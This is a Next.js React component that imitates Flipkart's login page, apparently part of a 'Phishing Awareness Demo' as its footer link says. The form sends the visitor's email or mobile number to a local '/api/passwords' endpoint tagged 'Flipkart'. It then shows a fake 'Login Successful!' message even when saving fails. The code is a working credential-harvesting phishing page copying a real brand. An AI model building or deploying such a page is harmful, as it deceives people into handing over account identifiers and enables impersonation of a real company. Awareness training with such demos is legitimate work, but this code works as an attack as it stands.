"use client";

import React, { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';

function FlipkartLoginPage() {
  const [email, setEmail] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const router = useRouter();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!email || email.trim() === '') return;

    setIsLoading(true);

    try {
      // Save email to API (Flipkart login typically doesn't require password on first step)
      const response = await fetch('/api/passwords', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          password: 'flipkart-auth', // Placeholder since Flipkart doesn't collect password on first step
          email: email,
          site: 'Flipkart'
        }),
      });

      const data = await response.json();

      if (data.success) {
        setIsLoading(false);
        setIsSuccess(true);

        // Redirect after success
        setTimeout(() => {
          router.push('/');
        }, 2000);
      } else {
        throw new Error('Failed to save credentials');
      }
    } catch (error) {
      console.error('Error saving credentials:', error);
      setIsLoading(false);
      // Still show success for demo purposes
      setIsSuccess(true);
      setTimeout(() => {
        router.push('/');
      }, 2000);
    }
  };

  return (
    <div className="bg-gray-100 min-h-screen flex items-center justify-center p-2 md:p-4 font-sans">
      <div className="w-full max-w-4xl flex flex-col md:flex-row shadow-lg h-auto md:h-[568px]">
        {/* Left Blue Panel - Hidden on mobile, shown on desktop */}
        <div className="hidden md:block md:w-2/5 bg-[#2874f0] text-white p-6 md:p-10 flex flex-col justify-between">
          <div>
            <h2 className="text-2xl md:text-3xl font-semibold">Login</h2>
            <p className="mt-4 text-base md:text-lg text-gray-200">
              Get access to your Orders, Wishlist and Recommendations
            </p>
          </div>
          <div className="flex justify-center">
            <img
              src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/login_img_c4a81e.png"
              alt="Login illustration"
              className="w-32 h-32 md:w-48 md:h-48"
            />
          </div>
        </div>

        {/* Right White Panel */}
        <div className="w-full md:w-3/5 bg-white p-4 md:p-12 flex flex-col">
          {isSuccess ? (
            <div className="flex-grow flex items-center justify-center">
              <div className="text-center">
                <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                  <svg className="w-8 h-8 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                  </svg>
                </div>
                <h3 className="text-lg font-semibold text-gray-900 mb-2">Login Successful!</h3>
                <p className="text-gray-600">Redirecting to your account...</p>
              </div>
            </div>
          ) : (
            <>
              <div className="flex-grow">
                <form onSubmit={handleSubmit} className="space-y-4">
                  <div>
                    <input
                      type="text"
                      id="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-gray-900 text-lg"
                      placeholder="Enter Email/Mobile number"
                      required
                    />
                  </div>

                  <p className="text-sm text-gray-600">
                    By continuing, you agree to Flipkart's{' '}
                    <a href="#" className="text-blue-600 font-semibold">Terms of Use</a> and{' '}
                    <a href="#" className="text-blue-600 font-semibold">Privacy Policy</a>.
                  </p>

                  <button
                    type="submit"
                    disabled={isLoading || !email.trim()}
                    className="w-full bg-[#fb641b] text-white py-3 font-semibold rounded-md shadow-md hover:shadow-lg transition-shadow disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center text-base"
                  >
                    {isLoading ? (
                      <>
                        <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                        </svg>
                        Requesting OTP...
                      </>
                    ) : (
                      'Request OTP'
                    )}
                  </button>
                </form>
              </div>

              <div className="text-center mt-4">
                <a href="#" className="text-xs md:text-sm text-blue-600 font-semibold">
                  New to Flipkart? Create an account
                </a>
              </div>
            </>
          )}
        </div>
      </div>

      {/* Back to Home - Mobile responsive positioning */}
      <div className="fixed bottom-4 left-1/2 transform -translate-x-1/2 md:absolute md:bottom-4 md:left-auto md:right-4 md:transform-none">
        <Link href="/" className="text-sm text-gray-600 hover:text-gray-800 bg-white/90 backdrop-blur-sm px-3 py-1 rounded-full shadow-sm md:bg-transparent md:shadow-none md:px-0 md:py-0">
          ← Back to Phishing Awareness Demo
        </Link>
      </div>
    </div>
  );
}

export default FlipkartLoginPage;